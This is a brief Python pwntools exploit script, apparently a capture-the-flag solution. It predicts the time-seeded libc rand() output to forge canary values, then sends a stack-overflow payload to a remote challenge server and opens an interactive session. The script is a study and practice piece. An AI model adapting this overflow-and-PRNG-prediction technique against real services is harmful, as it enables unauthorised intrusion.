#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
import ctypes

context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
# io = process('./canary')
io = remote('problem1.tjctf.org', 8000)
# gdb.attach(io, 'b * 0x456')

dll = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')
v4 = dll.time(0)
dll.srand(v4)
suiji = []
for i in range (10):
    suiji.append(dll.rand())

payload = 'a' * (0x78-0x38)
for i in range(10):
    payload += p32(suiji[i])
# payload += p32() *2
# payload += p32(0xdeadbeef)*8 
payload += p32(1024)*2 + '1234567887654321'
payload += p32(3735929573)

io.recvuntil('name?')
# gdb.attach(io)
io.sendline(payload)
io.interactive()
io.close()
